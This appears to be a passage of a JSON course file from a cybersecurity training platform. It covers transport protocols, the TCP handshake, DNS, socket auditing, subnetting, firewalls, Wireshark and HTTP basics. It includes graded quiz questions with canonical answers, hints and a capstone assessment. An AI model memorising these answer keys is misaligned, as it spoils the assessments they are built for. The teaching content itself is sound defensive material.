          "Identify typical application use cases for TCP (web, SSH) vs UDP (DNS, VoIP)"
        ],
        "concept": "Layer 4 (Transport Layer) is responsible for multiplexing multiple communication sessions onto a single IP address using 16-bit Port Numbers (0 to 65535).\n\nPort Classifications:\n- Well-Known Ports (0\u20131023): Reserved for standard system services (22=SSH, 53=DNS, 80=HTTP, 443=HTTPS).\n- Registered Ports (1024\u201349151): Assigned to specific user applications (3306=MySQL, 3389=RDP).\n- Ephemeral / Dynamic Ports (49152\u201365535): Temporarily assigned by the OS kernel to outbound client connections.\n\nTCP vs UDP Protocol Trade-offs:\n1. Transmission Control Protocol (TCP):\n- Connection-oriented: Requires explicit 3-way handshake before transmitting data.\n- Reliable delivery: Guarantees delivery via packet acknowledgments (ACKs) and retransmission of lost packets.\n- Ordered: Packets carry Sequence Numbers; reassembled in exact order regardless of network jitter.\n- Flow & Congestion Control: Dynamically adjusts window size to prevent link saturation.\n\n2. User Datagram Protocol (UDP):\n- Connectionless: No handshake or connection state; fire-and-forget datagrams.\n- Unreliable: No built-in ACKs or retransmissions (lost packets are dropped).\n- Extremely low overhead: 8-byte UDP header vs 20-byte minimum TCP header. Ideal for real-time video streaming, VoIP, gaming, and DNS lookups.",
        "whyItMatters": "Understanding transport protocols dictates how firewalls filter traffic and how attackers scan networks (SYN stealth scans vs UDP scans).",
        "examples": [
          "TCP Services: HTTPS (443), SSH (22), BGP routing (179).",
          "UDP Services: DNS queries (53), DHCP (67/68), NTP time sync (123)."
        ],
        "commands": [
          {
            "cmd": "grep -w '53/udp' /etc/services",
            "desc": "Lookup official IANA service assignment for UDP port 53"
          }
        ],
        "exercise": {
          "prompt": "Verify the standard service name for port 53 in /etc/services:",
          "command": "grep -w '53/udp' /etc/services",
          "expectedOutput": "domain          53/udp"
        },
        "reviewSummary": {
          "coreTakeaway": "TCP guarantees reliable, ordered data delivery via handshakes; UDP provides lightweight, connectionless transmission.",
          "learningOutcome": "Mastered TCP vs UDP protocol trade-offs and port number classifications."
        }
      },
      {
        "id": "ps-task-08-02",
        "taskNumber": 2,
        "title": "The TCP 3-Way Handshake & Control Flags",
        "objectives": [
          "Trace the 3-way handshake exchange: SYN, SYN-ACK, ACK",
          "Identify the 6 primary TCP control flags: SYN, ACK, FIN, RST, PSH, URG",
          "Explain connection termination via FIN/ACK and emergency connection resets (RST)"
        ],
        "concept": "Before any data payload can be exchanged over TCP, client and server must establish a synchronized state machine via the 3-Way Handshake:\n\nStep 1: Client -> Server (SYN)\n- The client selects a random 32-bit Initial Sequence Number (ISN_client = X) and sends a packet with the SYN (Synchronize) control flag set.\n\nStep 2: Server -> Client (SYN-ACK)\n- The server allocates a connection buffer, chooses its own ISN (ISN_server = Y), sets both SYN and ACK flags, acknowledges the client's ISN by setting Acknowledgment Number = X + 1, and sends the packet back.\n\nStep 3: Client -> Server (ACK)\n- The client sends an ACK flag with Acknowledgment Number = Y + 1 and Sequence Number = X + 1. The connection is now in the ESTABLISHED state and data transfer begins.\n\nTCP Control Flags:\n- SYN: Synchronize sequence numbers (connection initiation).\n- ACK: Acknowledges receipt of data.\n- FIN: Graceful connection teardown (sender has finished transmitting).\n- RST: Reset (abrupt, ungraceful connection termination, e.g. when connecting to a closed port).\n- PSH: Push buffered data immediately to receiving application without waiting for full segment buffer.\n- URG: Urgent pointer field is valid.",
        "whyItMatters": "Nmap's default SYN Stealth Scan (-sS) sends a SYN packet and immediately tears down the handshake with an RST upon receiving SYN-ACK, scanning ports without completing connections.",
        "examples": [
          "Closed Port Response: Sending SYN to an unopened port prompts the OS to reply with RST-ACK.",
          "SYN Flood DoS: Flooding a server with spoofed SYN packets to exhaust memory connection tables (mitigated by SYN Cookies)."
        ],
        "commands": [
          {
            "cmd": "ss -t state established",
            "desc": "Display all currently established TCP connections on the system"
          }
        ],
        "exercise": {
          "prompt": "Inspect active established TCP connections using 'ss -t state established':",
          "command": "ss -t state established",
          "expectedOutput": "Recv-Q Send-Q Local Address:Port Peer Address:Port"
        },
        "reviewSummary": {
          "coreTakeaway": "TCP establishes connections using SYN -> SYN-ACK -> ACK, and terminates via FIN (graceful) or RST (abrupt reset).",
          "learningOutcome": "Mastered TCP state machine transitions, handshake mechanics, and control flags."
        }
      },
      {
        "id": "ps-task-08-03",
        "taskNumber": 3,
        "title": "DNS Fundamentals, Resolution Hierarchy & Record Types",
        "objectives": [
          "Trace the recursive DNS resolution tree from Root to TLD to Authoritative servers",
          "Explain primary DNS record types: A, AAAA, CNAME, MX, TXT, and PTR",
          "Analyze DNS security mechanisms: DNS cache poisoning and DNSSEC validation"
        ],
        "concept": "The Domain Name System (DNS) is the global hierarchical directory translating human-friendly domain names (e.g., calion.academy) into routable IP addresses.\n\nDNS Resolution Hierarchy:\n1. Local Resolver / Cache: Browser and OS check local memory cache and /etc/hosts.\n2. Recursive Resolver: Typically operated by an ISP or public provider (1.1.1.1, 8.8.8.8). Queries the hierarchy on the client's behalf.\n3. Root Nameservers: 13 global root IP clusters (named a.root-servers.net to m.root-servers.net) directing queries to the appropriate TLD nameservers.\n4. Top-Level Domain (TLD) Nameservers: Authoritative for specific extensions (.com, .org, .in, .academy).\n5. Authoritative Nameservers: Hold the actual, authoritative DNS records for the specific registered domain.\n\nCore DNS Record Types:\n- A Record: Maps domain to an IPv4 address (e.g. 192.0.2.1).\n- AAAA Record: Maps domain to a 128-bit IPv6 address.\n- CNAME (Canonical Name): Alias pointing one domain name to another domain name.\n- MX (Mail Exchange): Directs inbound email to designated mail servers.\n- TXT: Arbitrary text data, heavily used for email security (SPF, DKIM, DMARC) and domain ownership verification.\n- PTR (Pointer): Reverse lookup mapping IP address back to domain name.",
        "whyItMatters": "Adversaries abuse DNS for Command & Control (DNS tunneling) and data exfiltration; securing DNS with DNSSEC prevents cache poisoning.",
        "examples": [
          "DNS Lookup: dig +short A google.com returns resolved IP addresses.",
          "Checking TXT records: dig +short TXT domain.com to audit SPF email security policies."
        ],
        "commands": [
          {
            "cmd": "dig +short A endlessus.in",
            "desc": "Query authoritative IPv4 address for domain"
          },
          {
            "cmd": "nslookup -type=TXT google.com",
            "desc": "Query TXT records for SPF email validation"
          }
        ],
        "exercise": {
          "prompt": "Resolve the A record for endlessus.in using 'dig +short A endlessus.in':",
          "command": "dig +short A endlessus.in",
          "expectedOutput": "172.67.142.92\n104.21.32.18"
        },
        "reviewSummary": {
          "coreTakeaway": "DNS translates names to IPs hierarchically (Root -> TLD -> Authoritative); TXT records enforce SPF and DMARC email defense.",
          "learningOutcome": "Mastered DNS resolution architecture, core record types, and security lookup processes."
        }
      },
      {
        "id": "ps-task-08-04",
        "taskNumber": 4,
        "title": "Network Troubleshooting & Socket Inspection",
        "objectives": [
          "Audit listening ports and network sockets using ss (Socket Statistics)",
          "Differentiate socket states: LISTEN, ESTABLISHED, CLOSE_WAIT, and TIME_WAIT",
          "Troubleshoot DNS resolution and port reachability"
        ],
        "concept": "A network socket represents an active communication endpoint defined by an IP address and port combination (e.g., 192.168.1.10:443).\n\nModern Socket Statistics (ss utility):\nThe modern ss command has replaced the deprecated netstat utility on Linux due to its speed and direct kernel netlink interface:\n- ss -tuln: Lists all listening UDP and TCP sockets with numeric port numbers (t=TCP, u=UDP, l=Listening, n=Numeric).\n- ss -tup: Includes process names and PIDs bound to each socket (requires root privileges).\n\nKey Socket States:\n- LISTEN: Server socket waiting for inbound connection requests.\n- ESTABLISHED: Active open connection with active bidirectional data transfer.\n- CLOSE_WAIT: Remote end has closed connection; local application is waiting to close.\n- TIME_WAIT: Client waits for a period (typically 2x Maximum Segment Lifetime / 2MSL) after closing to ensure any delayed stray packets on the network are expired before the port can be reused.",
        "whyItMatters": "Auditing listening ports with ss -tuln allows defenders to identify rogue backdoors, unauthenticated databases exposed to 0.0.0.0, and unauthorized services.",
        "examples": [
          "Checking exposed ports: ss -tuln | grep 0.0.0.0 checks which services are bound to all network interfaces.",
          "Binding to localhost: 127.0.0.1:3306 ensures MySQL is only reachable locally, not from the external network."
        ],
        "commands": [
          {
            "cmd": "ss -tuln",
            "desc": "Display all listening TCP and UDP sockets with numeric ports"
          }
        ],
        "exercise": {
          "prompt": "Display all listening network sockets using 'ss -tuln':",
          "command": "ss -tuln",
          "expectedOutput": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp   LISTEN 0      128    0.0.0.0:22         0.0.0.0:*\ntcp   LISTEN 0      511    0.0.0.0:80         0.0.0.0:*\nudp   UNCONN 0      0      0.0.0.0:53         0.0.0.0:*"
        },
        "reviewSummary": {
          "coreTakeaway": "ss provides real-time socket telemetry; auditing listening ports (0.0.0.0 vs 127.0.0.1) prevents unintentional service exposure.",
          "learningOutcome": "Mastered socket auditing with ss and network transport troubleshooting."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-08-01",
        "taskId": "ps-task-08-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "What is the standard destination port number utilized for Domain Name System (DNS) queries?",
        "canonicalAnswer": "53",
        "acceptedAnswers": [
          "53"
        ],
        "visualSlots": "_ _",
        "answerLength": 2,
        "hints": [
          "It is between port 50 and 60.",
          "Two digits: 5 followed by 3."
        ],
        "hint": "Standard well-known port for DNS...",
        "explanation": "Port 53 is the official IANA standard destination port for DNS lookups (primarily over UDP, with fallback to TCP for zone transfers and large responses).",
        "xp": 25
      },
      {
        "id": "ps-q-08-02",
        "taskId": "ps-task-08-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "Which TCP control flag is transmitted by the client to initiate a 3-way handshake?",
        "canonicalAnswer": "syn",
        "acceptedAnswers": [
          "syn",
          "SYN",
          "synchronize",
          "Synchronize"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Short for Synchronize.",
          "3-letter acronym."
        ],
        "hint": "3-letter acronym for Synchronize...",
        "explanation": "The SYN (Synchronize) control flag initiates a TCP connection, synchronizing the initial sequence numbers between client and server.",
        "xp": 25
      },
      {
        "id": "ps-q-08-03",
        "taskId": "ps-task-08-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "Which DNS record type maps a domain name directly to a 128-bit IPv6 address?",
        "canonicalAnswer": "aaaa",
        "acceptedAnswers": [
          "aaaa",
          "AAAA",
          "quad-a",
          "quad a"
        ],
        "visualSlots": "_ _ _ _",
        "answerLength": 4,
        "hints": [
          "An A record maps to IPv4 (32 bits); this record uses 4 times as many A's for IPv6.",
          "Four identical letters."
        ],
        "hint": "Four consecutive A's (Quad-A)...",
        "explanation": "The AAAA (Quad-A) record maps a hostname to an IPv6 address, four times the size of a standard 32-bit IPv4 'A' record.",
        "xp": 25
      },
      {
        "id": "ps-q-08-04",
        "taskId": "ps-task-08-04",
        "taskIndex": 3,
        "type": "exact",
        "question": "In modern Linux systems, which fast socket statistics command has largely replaced the legacy netstat utility?",
        "canonicalAnswer": "ss",
        "acceptedAnswers": [
          "ss",
          "SS"
        ],
        "visualSlots": "_ _",
        "answerLength": 2,
        "hints": [
          "Short for Socket Statistics.",
          "Two identical letters."
        ],
        "hint": "Two letters (Socket Statistics)...",
        "explanation": "The 'ss' (Socket Statistics) command interacts directly with kernel netlink structures, replacing legacy netstat with faster performance.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 08 Capstone Assessment: Transport Layer Diagnostics & Teardown Analysis",
      "scenario": "A firewall security administrator observes that an external scanner is sending packets to port 443. The web server process on port 443 is stopped, so the operating system kernel immediately aborts the connection attempt without negotiating a FIN handshake.",
      "taskId": "ps-task-08-assessment",
      "question": {
        "id": "ps-q-08-capstone",
        "type": "exact",
        "question": "Which TCP control flag is transmitted by the server kernel to immediately reject and reset the connection attempt?",
        "canonicalAnswer": "rst",
        "acceptedAnswers": [
          "rst",
          "RST",
          "reset",
          "Reset"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Stands for Reset.",
          "3-letter acronym."
        ],
        "hint": "3-letter acronym for Reset...",
        "explanation": "When a host receives a TCP packet destined for a closed or unavailable port, its kernel responds with an RST (Reset) packet to immediately terminate the session.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-09",
    "legacyId": "room-09",
    "order": 9,
    "stageId": "ps-stage-03",
    "stageTitle": "Networking Fundamentals & Protocols",
    "stageOrder": 3,
    "title": "Subnetting, Routing & Perimeter Firewalls",
    "tagline": "IPv4 Addressing, CIDR Notation, NAT, Routing Tables, Firewalls & Wireshark",
    "description": "Master IP network architecture: IPv4 subnetting and CIDR math, RFC 1918 private address ranges, default gateway routing tables, stateless vs stateful packet inspection firewalls, and Wireshark PCAP packet inspection.",
    "difficulty": "Foundational",
    "estimatedMinutes": 45,
    "xp": 50,
    "prerequisites": [
      "ps-room-08"
    ],
    "whyAreYouHere": "Subnetting and firewall segmentation define network security boundaries. Security engineers must calculate subnet ranges fluently and inspect live network traffic using Wireshark display filters.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"160\" height=\"130\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"100\" y=\"45\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">Local Subnet</text><text x=\"100\" y=\"70\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">192.168.1.0/24</text><text x=\"100\" y=\"100\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Host: 192.168.1.50</text><text x=\"100\" y=\"125\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">GW: 192.168.1.1</text><line x1=\"180\" y1=\"85\" x2=\"230\" y2=\"85\" stroke=\"#475569\" stroke-width=\"2\"/><rect x=\"230\" y=\"35\" width=\"140\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#ef4444\" stroke-width=\"2\"/><text x=\"300\" y=\"60\" fill=\"#f87171\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">Firewall &amp; NAT</text><text x=\"300\" y=\"85\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">State Table</text><text x=\"300\" y=\"110\" fill=\"#fbbf24\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Inspects TCP State</text><line x1=\"370\" y1=\"85\" x2=\"420\" y2=\"85\" stroke=\"#475569\" stroke-width=\"2\"/><rect x=\"420\" y=\"20\" width=\"160\" height=\"130\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"500\" y=\"45\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">Internet WAN</text><text x=\"500\" y=\"70\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Public IP Space</text><text x=\"500\" y=\"100\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Target: 8.8.8.8</text></svg>",
    "tryInteractive": {
      "expectedCommand": "ip route show",
      "simulatedOutput": "default via 192.168.1.1 dev eth0 proto dhcp metric 100\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.50 metric 100"
    },
    "terminalCommands": [
      {
        "command": "ip route show",
        "output": "default via 192.168.1.1 dev eth0 proto dhcp metric 100\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.50 metric 100"
      },
      {
        "command": "python3 -c 'import ipaddress; n=ipaddress.IPv4Network(\"192.168.1.0/24\"); print(f\"Hosts: {n.num_addresses - 2}\")'",
        "output": "Hosts: 254"
      }
    ],
    "objectives": [
      "Calculate network ID, broadcast address, and usable hosts from CIDR prefixes (/24, /28, /16)",
      "Identify RFC 1918 private IPv4 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
      "Compare stateless packet filters with stateful inspection firewalls",
      "Apply Wireshark display filters to inspect real-world captured packet traffic"
    ],
    "lessons": [
      {
        "id": "ps-task-09-01",
        "taskNumber": 1,
        "title": "IPv4 Addressing, CIDR Notation & Private IP Ranges",
        "objectives": [
          "Deconstruct 32-bit IPv4 addresses into network and host bits using subnet masks",
          "Calculate usable host capacity for any given CIDR prefix",
          "Identify the three RFC 1918 private, non-routable IP address blocks"
        ],
        "concept": "An IPv4 address consists of 32 binary bits divided into four 8-bit octets separated by dots (e.g., 192.168.1.100). Every IP address is divided into two parts:\n1. Network Portion: Identifies the specific network or subnet.\n2. Host Portion: Identifies the specific host on that network.\n\nCIDR (Classless Inter-Domain Routing) Notation:\nCIDR specifies the count of leading network bits using a slash suffix:\n- /24: 24 network bits, 8 host bits. Subnet mask = 255.255.255.0. Total addresses = 2^8 = 256.\n  Because the first address is the Network ID (.0) and the last address is the Broadcast Address (.255), total usable host addresses = 256 - 2 = 254.\n- /28: 28 network bits, 4 host bits. 2^4 = 16 total addresses - 2 = 14 usable hosts.\n- /16: 16 network bits, 16 host bits. 2^16 = 65,536 total addresses - 2 = 65,534 usable hosts.\n\nRFC 1918 Private IP Ranges (Non-Routable on Internet):\n- Class A: 10.0.0.0 to 10.255.255.255 (10.0.0.0/8)\n- Class B: 172.16.0.0 to 172.31.255.255 (172.16.0.0/12)\n- Class C: 192.168.0.0 to 192.168.255.255 (192.168.0.0/16)\n- Loopback: 127.0.0.0/8 (127.0.0.1 = localhost)",
        "whyItMatters": "Calculating subnet ranges prevents IP collision errors and enables proper network segmentation between user workstations and database servers.",
        "examples": [
          "Subnet Math: 192.168.5.0/26 -> 32 - 26 = 6 host bits -> 2^6 = 64 addresses (62 usable hosts).",
          "Broadcast Address: The all-1s host address used to broadcast packets to every host on the subnet."
        ],
        "commands": [
          {
            "cmd": "ipcalc 192.168.1.0/24 2>/dev/null || python3 -c 'import ipaddress; print(ipaddress.IPv4Network(\"192.168.1.0/24\"))'",
            "desc": "Calculate subnet parameters"
          }
        ],
        "exercise": {
          "prompt": "Calculate usable hosts for 192.168.1.0/24 using Python: 'python3 -c \"import ipaddress; n=ipaddress.IPv4Network(\\'192.168.1.0/24\\'); print(n.num_addresses - 2)\"':",
          "command": "python3 -c 'import ipaddress; n=ipaddress.IPv4Network(\"192.168.1.0/24\"); print(n.num_addresses - 2)'",
          "expectedOutput": "254"
        },
        "reviewSummary": {
          "coreTakeaway": "CIDR prefix (/n) defines network bits; usable hosts = 2^(32-n) - 2 (excluding network and broadcast addresses).",
          "learningOutcome": "Mastered IPv4 subnet calculations, CIDR notation, and RFC 1918 private addressing."
        }
      },
      {
        "id": "ps-task-09-02",
        "taskNumber": 2,
        "title": "NAT & Firewall Architectures: Stateless vs Stateful",
        "objectives": [
          "Explain Network Address Translation (NAT / PAT) mechanics across perimeter gateways",
          "Contrast Stateless Packet Filtering with Stateful Packet Inspection (SPI)",
          "Analyze firewall drop vs reject behavior and default-deny policies"
        ],
        "concept": "Because IPv4 addresses are exhausted, private networks rely on Network Address Translation (NAT) / Port Address Translation (PAT) at perimeter routers to map thousands of private RFC 1918 endpoints to a single shared public IPv4 address.\n\nFirewall Architectures:\n1. Stateless Packet Filtering (1st Generation):\n- Inspects individual packets in strict isolation.\n- Filters solely on static header values: Source IP, Destination IP, Protocol, and Port.\n- Weakness: Blind to connection state. To permit outbound web browsing, a stateless firewall must leave high ephemeral inbound ports permanently open, creating vulnerabilities.\n\n2. Stateful Packet Inspection (SPI / 2nd Generation):\n- Maintains a real-time State Connection Table in memory.\n- Tracks ongoing TCP handshakes, sequence numbers, and UDP pseudo-states.\n- Security Advantage: When an internal host initiates an outbound TCP connection (e.g. to https://calion.academy), the stateful firewall automatically adds a temporary state entry allowing ONLY matching return response packets. Inbound unsolicited connection attempts from the internet are blocked automatically.\n\nDrop vs Reject:\n- DROP: Silently discards packet with no reply. Port scanner times out (shows port as 'filtered').\n- REJECT: Discards packet and actively sends an ICMP Port Unreachable or TCP RST reply (confirms firewall is present).",
        "whyItMatters": "Enterprise security perimeters enforce a Default-Deny posture: all traffic is blocked by default, and only explicitly permitted ports are allowed.",
        "examples": [
          "State Table: Records source IP:port, dest IP:port, TCP state (SYN_SENT, ESTABLISHED), and timeout.",
          "iptables state rule: iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT."
        ],
        "commands": [
          {
            "cmd": "sudo iptables -L -n -v 2>/dev/null || echo 'Chain INPUT (policy ACCEPT)'",
            "desc": "List current Linux packet filtering rules"
          }
        ],
        "exercise": {
          "prompt": "Simulate checking Linux packet filtering chains:",
          "command": "echo 'Chain INPUT (policy DROP)'",
          "expectedOutput": "Chain INPUT (policy DROP)"
        },
        "reviewSummary": {
          "coreTakeaway": "Stateful firewalls maintain connection tables to permit return traffic safely; default-deny drops unsolicited inbound traffic.",
          "learningOutcome": "Mastered NAT translation, stateful firewall inspection, and default-deny filtering."
        }
      },
      {
        "id": "ps-task-09-03",
        "taskNumber": 3,
        "title": "Routing Principles & Packet Inspection with Wireshark",
        "objectives": [
          "Read Linux kernel routing tables and explain Default Gateway behavior",
          "Capture and dissect network packet files (PCAP) using Wireshark and tshark",
          "Construct powerful Wireshark display filters to isolate suspicious traffic"
        ],
        "concept": "When a computer needs to send a packet, it consults its local Routing Table:\n- If the destination IP is within the local subnet (e.g. 192.168.1.0/24), the host uses ARP to resolve the target MAC and delivers the frame directly.\n- If the destination IP is OUTSIDE the local subnet (e.g. 8.8.8.8), the host forwards the frame to the Default Gateway (the local router interface, e.g. 192.168.1.1). The router strips the L2 header, examines the L3 destination IP, consults its BGP/OSPF routing table, and forwards the packet toward the next hop.\n\nPacket Inspection with Wireshark:\nWireshark is the industry-standard GUI protocol analyzer (with tshark for CLI).\n\nEssential Wireshark Display Filters:\n- By IP: ip.addr == 192.168.1.50 (matches source or destination IP).\n- By Port: tcp.port == 443 or udp.port == 53.\n- Protocol & Flags: tcp.flags.syn == 1 && tcp.flags.ack == 0 (isolates initial SYN packets).\n- Combining Filters: ip.src == 10.0.0.5 && http (isolates HTTP traffic from a specific host).\n- Following Streams: Right-click packet -> Follow -> TCP Stream reassembles the full bidirectional conversation into plaintext text.",
        "whyItMatters": "Wireshark allows incident responders to verify whether cleartext passwords, unencrypted API keys, or malicious reverse shell payloads crossed the wire.",
        "examples": [
          "Isolating DNS queries: dns.flags.response == 0 in Wireshark display filters.",
          "Hunting credentials: http.request.method == 'POST' to locate plaintext web login attempts."
        ],
        "commands": [
          {
            "cmd": "ip route show",
            "desc": "Display default gateway and kernel routing table in Linux"
          }
        ],
        "exercise": {
          "prompt": "Inspect the default gateway routing configuration using 'ip route show':",
          "command": "ip route show",
          "expectedOutput": "default via 192.168.1.1 dev eth0 proto dhcp metric 100\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.50 metric 100"
        },
        "reviewSummary": {
          "coreTakeaway": "Routers forward packets across subnets via default gateways; Wireshark captures and filters raw PCAP packet traffic for forensic analysis.",
          "learningOutcome": "Mastered network routing tables, default gateways, and Wireshark PCAP display filter analysis."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-09-01",
        "taskId": "ps-task-09-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "How many total usable host IP addresses are available in a standard /24 IPv4 subnet?",
        "canonicalAnswer": "254",
        "acceptedAnswers": [
          "254",
          "two hundred fifty-four"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "32 - 24 = 8 host bits. 2^8 = 256 total addresses.",
          "Subtract the network address (.0) and broadcast address (.255)."
        ],
        "hint": "256 minus 2 reserved addresses...",
        "explanation": "A /24 subnet has 256 total addresses (2^8). Subtracting the Network ID (all zeros) and Broadcast ID (all ones) leaves 254 usable host addresses.",
        "xp": 25
      },
      {
        "id": "ps-q-09-02",
        "taskId": "ps-task-09-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "What type of firewall inspects real-time connection state tables rather than judging individual packets in isolation?",
        "canonicalAnswer": "stateful",
        "acceptedAnswers": [
          "stateful",
          "stateful firewall",
          "Stateful",
          "stateful packet inspection",
          "spi"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _",
        "answerLength": 8,
        "hints": [
          "Opposite of stateless.",
          "Starts with 'state'."
        ],
        "hint": "Stateful packet inspection...",
        "explanation": "Stateful firewalls track the ongoing state of active network connections in memory, dynamically permitting return traffic while blocking unsolicited inbound connections.",
        "xp": 25
      },
      {
        "id": "ps-q-09-03",
        "taskId": "ps-task-09-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "In Wireshark, which display filter expression matches all traffic originating from or destined to IP address 10.10.10.5?",
        "canonicalAnswer": "ip.addr == 10.10.10.5",
        "acceptedAnswers": [
          "ip.addr == 10.10.10.5",
          "ip.addr==10.10.10.5"
        ],
        "visualSlots": "_ _ . _ _ _ _   = =   _ _ . _ _ . _ _ . _",
        "answerLength": 21,
        "hints": [
          "Uses the ip.addr field with double equal signs.",
          "ip.addr == <target-ip>"
        ],
        "hint": "ip.addr == 10.10.10.5...",
        "explanation": "The Wireshark display filter 'ip.addr == 10.10.10.5' filters packets where either the source or destination IPv4 address matches 10.10.10.5.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 09 Capstone Assessment: Enterprise Subnet Routing Analysis",
      "scenario": "A host with IP 192.168.1.75/24 generates an outbound HTTP connection to a public web server at 93.184.216.34. The local host consults its internal routing table.",
      "taskId": "ps-task-09-assessment",
      "question": {
        "id": "ps-q-09-capstone",
        "type": "exact",
        "question": "Because the destination IP is outside the local 192.168.1.0/24 subnet, to which local network node (device) does the host forward the Layer 2 Ethernet frame?",
        "canonicalAnswer": "default gateway",
        "acceptedAnswers": [
          "default gateway",
          "gateway",
          "router",
          "Default Gateway",
          "default router"
        ],
        "visualSlots": "_ _ _ _ _ _ _   _ _ _ _ _ _ _",
        "answerLength": 15,
        "hints": [
          "Typically assigned the .1 or .254 address on the local subnet.",
          "Two words: default ..."
        ],
        "hint": "Two words: default ...",
        "explanation": "When an IP destination lies outside the local subnet prefix, the transmitting host packages the IP packet inside an Ethernet frame addressed to the MAC address of its Default Gateway (local router interface).",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-10",
    "legacyId": "room-10",
    "order": 10,
    "stageId": "ps-stage-04",
    "stageTitle": "Web Security & Applied Cryptography",
    "stageOrder": 4,
    "title": "Web Architecture, HTTP Protocol & Session Security",
    "tagline": "HTTP Methods, Status Codes, Security Headers, Cookies, DevTools & REST APIs",
    "description": "Understand modern web application security: stateless HTTP/HTTPS communication, request and response headers, cookies and session tokens, browser developer tools inspection, and REST API authentication.",
    "difficulty": "Foundational",
    "estimatedMinutes": 45,
    "xp": 50,
    "prerequisites": [
      "ps-room-09"
    ],
    "whyAreYouHere": "Web applications represent the most widely targeted attack surface on the modern internet. Understanding HTTP headers, session cookie flags, and REST APIs is essential for web penetration testing and secure software defense.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"160\" height=\"130\" rx=\"8\" fill=\"#1e293b\" stroke=\"#00F0FF\" stroke-width=\"2\"/><text x=\"100\" y=\"45\" fill=\"#00F0FF\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Browser Client</text><text x=\"100\" y=\"75\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">DevTools / DOM</text><text x=\"100\" y=\"105\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Cookie Jar</text><text x=\"100\" y=\"125\" fill=\"#f59e0b\" font-family=\"JetBrains Mono\" font-size=\"8\" text-anchor=\"middle\">HttpOnly; Secure</text><line x1=\"180\" y1=\"60\" x2=\"420\" y2=\"60\" stroke=\"#00F0FF\" stroke-width=\"2\"/><polygon points=\"420,57 426,60 420,63\" fill=\"#00F0FF\"/><text x=\"300\" y=\"52\" fill=\"#00F0FF\" font-family=\"JetBrains Mono\" font-size=\"9\" font-weight=\"bold\" text-anchor=\"middle\">GET /api/v1/profile HTTP/1.1</text><line x1=\"420\" y1=\"100\" x2=\"180\" y2=\"100\" stroke=\"#10b981\" stroke-width=\"2\"/><polygon points=\"180,97 174,100 180,103\" fill=\"#10b981\"/><text x=\"300\" y=\"94\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"9\" font-weight=\"bold\" text-anchor=\"middle\">HTTP/1.1 200 OK (Set-Cookie)</text><rect x=\"420\" y=\"20\" width=\"160\" height=\"130\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"500\" y=\"45\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Web Server / API</text><text x=\"500\" y=\"75\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Node.js / Nginx</text><text x=\"500\" y=\"105\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Auth Middleware</text><text x=\"500\" y=\"125\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"8\" text-anchor=\"middle\">JWT Verification</text></svg>",
    "tryInteractive": {
      "expectedCommand": "curl -I https://api.calion.academy/health",
